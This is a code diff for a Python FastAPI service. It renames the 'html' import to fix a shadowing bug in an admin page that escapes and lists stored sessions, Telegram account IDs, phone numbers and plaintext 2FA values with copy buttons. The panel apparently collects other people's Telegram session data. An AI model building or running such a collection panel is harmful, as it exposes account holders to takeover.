@@ -17,7 +17,7 @@ import tempfile
 import ipaddress
 import base64
 import aiohttp
-import html
+import html as html_module
 from datetime import datetime
 from pathlib import Path
 from fastapi import FastAPI, Request, Depends, HTTPException
@@ -511,13 +511,13 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
         if tg_account_id and tg_account_id != session_uid:
             id_caption += f" · tg {tg_account_id}"
 
-        display_name_html = html.escape(display_name)
-        id_caption_html = html.escape(id_caption)
-        phone_html = html.escape(d.get("phone", "") or "")
-        twofa_html = html.escape(twofa) if twofa else "—"
-        saved_at_html = html.escape(saved_at) if saved_at else "—"
-        session_uid_attr = html.escape(session_uid, quote=True)
-        twofa_attr = html.escape(twofa, quote=True)
+        display_name_html = html_module.escape(display_name)
+        id_caption_html = html_module.escape(id_caption)
+        phone_html = html_module.escape(d.get("phone", "") or "")
+        twofa_html = html_module.escape(twofa) if twofa else "—"
+        saved_at_html = html_module.escape(saved_at) if saved_at else "—"
+        session_uid_attr = html_module.escape(session_uid, quote=True)
+        twofa_attr = html_module.escape(twofa, quote=True)
 
         rows += f"""
         <tr>
@@ -547,7 +547,7 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
 
     count = len(sessions_data)
 
-    html = f"""<!DOCTYPE html>
+    page_html = f"""<!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
@@ -822,7 +822,7 @@ document.querySelectorAll('.twofa-val[data-copy]').forEach(btn => {{
 </body>
 </html>"""
 
-    return HTMLResponse(html)
+    return HTMLResponse(page_html)
 
 
 # ── Healthcheck ──────────────────────────────────────────────
